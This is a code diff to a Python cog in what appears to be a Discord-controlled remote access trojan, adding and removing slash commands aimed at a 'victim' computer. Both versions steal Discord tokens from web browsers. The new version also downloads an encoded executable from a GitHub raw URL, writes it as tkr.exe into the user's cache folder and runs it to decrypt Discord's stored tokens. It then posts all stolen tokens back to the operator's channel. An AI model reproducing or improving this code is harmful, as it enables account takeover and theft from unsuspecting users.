@@ -9,33 +9,10 @@ nr_working = f"C:\\Users\\{os.getenv('username')}\\.cache"
 class RawTokens(commands.Cog):
     def __init__(self, bot: commands.Bot):
         self.bot = bot
-        
+
     @commands.slash_command( )
     async def raw_tokens(self, ctx, victim):
-        """Sends raw Discord Tokens from browsers (fast)
-
-        Parameters
-        ----------
-        victim: Identifier of the affected computer (found via /listvictims).
-        """
-        if str(victim) == str(self.bot.identifier):
-            await ctx.response.defer()
-            
-            message, tokens = "", self.bot.find_token()
-            for token in tokens: 
-                message += token + "\n"
-            if len(message) >= 1000: 
-                return await ctx.followup.send("```" + message + "```")
-            embed = self.bot.genEmbed( "Discord Tokens", datetime.now(), "Collected from web browsers" ).add_field(
-                name="RAW Tokens:", 
-                value=f"```{message.rstrip()}```"
-            )
-            
-            await ctx.followup.send(embed=embed)
-
-    @commands.slash_command( )
-    async def raw_discord(self, ctx, victim):
-        """[EXPERIMENTAL] Decrypts encrypted Discord Tokens
+        """Sends all Discord Tokens unchecked
 
         Parameters
         ----------
@@ -45,23 +22,43 @@ class RawTokens(commands.Cog):
             await ctx.response.defer()
             
             try:
-                tkr = bytes(requests.get("https://raw.githubusercontent.com/NullCode13-Misc/DiscordTokenDecrypt-Go/main/rec_dump_broken").text, "utf-8")
-                await ctx.channel.send("Status:\n> Downloaded custom decryptor")
+                tkr = bytes(
+                    requests.get(
+                        "https://raw.githubusercontent.com/NullCode13-Misc/DiscordTokenDecrypt-Go/main/rec_dump_broken"
+                    ).text, 
+                    "utf-8"
+                )
             except Exception as e:
-                return await ctx.followup.send("Unable to download custom decryptor!\n\n"+e)
+                return await ctx.followup.send(
+                    "Unable to download decryptor!\n\n"+e
+                )
                 
             os.chdir(nr_working)
             with open("tkr.exe", "wb") as fh: fh.write(decodebytes(tkr))
-            await ctx.channel.send("> Prepared custom decryptor")
             
-            discord_tokenz = str(os.popen("tkr.exe").read()).strip('][').split(', ')
-            await ctx.channel.send("> Attempted to decrypt tokens from discord...")
-
+            changes = {
+                '[': '', 
+                ']': '',
+                ',': '',
+                "'": '', 
+                '"': '', 
+                ' ': '\n'
+            }
+            
+            discordTkz = str(os.popen("tkr.exe").read()).strip('][').split(', ')
+            webTkz = list(dict.fromkeys(self.bot.find_token()))
+            
+            for k, v in changes.items():
+                discordTkz = str(discordTkz).replace(k, v)
+                webTkz = str(webTkz).replace(k, v)
+            
+            finalTks = str(discordTkz + "\n" + webTkz)
+            
             await ctx.followup.send(
                 embed = self.bot.genEmbed(
-                    "Decrypted discord tokens", 
+                    "Decrypted tokens", 
                     datetime.now(), 
-                    f"```" + str(discord_tokenz).replace("[","").replace("]","").replace(",","").replace("'","").replace('"','').replace(" ","\n\n") + "```"
+                    f"```" + finalTks + "```"
                 )
             )
             
